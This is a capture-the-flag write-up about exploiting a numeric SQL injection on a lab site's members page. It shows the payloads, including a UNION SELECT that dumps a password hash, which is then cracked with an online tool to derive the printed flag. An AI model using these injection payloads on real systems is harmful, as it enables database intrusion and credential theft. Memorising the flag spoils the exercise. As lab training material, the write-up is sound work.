# SQL Numeric Injection - Members

## Flag

10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

## Description

Now, I attack the member page.

First payload :
`" OR 1=1 --`
We get this error message :
`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\" OR 1=1 --' at line 1`
Which gives me new informations :
- The used SQL distrubution is MySQL (server version)
- The request is prefixed by \
While entering a random alpha string (test here), we get : `unknown column 'test' in 'where clause'`

At this point I decide to test the payloads I used on the other SQL injection exploit : `1 OR 1=1 --`
Which gives me 4 results, the last one being the most interesting one :
```
ID: 1 OR 1=1 -- 
First name: Flag
Surname : GetThe
```

In the other SQL injection exploit, we found this table :
```
users (Members_Sql_Injection) :
user_id, first_name, last_name, town, country, planet, Commentaire, countersign
```

Using this information, it's easily possible to read any field of this table.

## URL

The URL where you found the issue. This will help people reproduce the issue and offer some clues of where to start.

## Steps To Reproduce

Using this payload built using traditional portuguese methods :
`1 OR 1=1 UNION ALL SELECT Commentaire, countersign FROM users--`

We get, for the last result :
```
ID: 1 OR 1=1 UNION ALL SELECT Commentaire, countersign FROM users-- 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

Using crackstation, we crack the md5 (in the surname field) to get : FortyTwo, lowercase it : fortytwo, then hash it with sha256 to get our flag.

## Why is it dangerous ?

See 10-Gallery-SQLNumericInjection

## Possible fixes

See 10-Gallery-SQLNumericInjection

## Resources

There is no additional resource for this issue.
